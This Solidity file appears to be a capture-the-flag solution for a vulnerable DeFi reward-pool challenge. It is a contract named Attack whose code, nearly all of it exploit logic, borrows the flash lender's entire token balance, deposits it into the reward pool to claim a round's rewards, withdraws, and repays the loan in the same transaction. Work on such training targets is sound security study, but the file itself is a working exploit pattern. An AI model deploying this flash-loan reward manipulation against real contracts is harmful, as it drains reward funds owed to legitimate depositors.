// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {

    function flashLoan(uint256 amount) external ;

}

interface ITheRewarderPool {

    function deposit(uint256 amount) external ;
    function distributeRewards() external returns (uint256 rewards);
    function withdraw(uint256 amount) external ;
    function isNewRewardsRound() external view returns (bool);
    
}


contract Attack {

    IFlashLoanerPool public flashPool;
    ITheRewarderPool public rewardPool;
    IERC20 public DVToken;
    IERC20 public RToken;

    function pwn(address _flashPool, address _rewardPool, address _DVToken, address _RToken) public {

        flashPool = IFlashLoanerPool(_flashPool);
        rewardPool = ITheRewarderPool(_rewardPool);
        DVToken = IERC20(_DVToken);
        RToken = IERC20(_RToken);


        uint256 flashPoolBalance = DVToken.balanceOf(_flashPool);

        flashPool.flashLoan(flashPoolBalance);                             // 1

        //RToken.transfer(msg.sender, RToken.balanceOf(address(this)));      // 5 
    
    }


    function receiveFlashLoan(uint256 _amount) public {
        
        DVToken.approve(address(rewardPool), _amount);

        rewardPool.deposit(_amount);                                       // 2

        rewardPool.withdraw(_amount);                                      // 3

        DVToken.transfer(address(flashPool), _amount);                     // 4

    }

}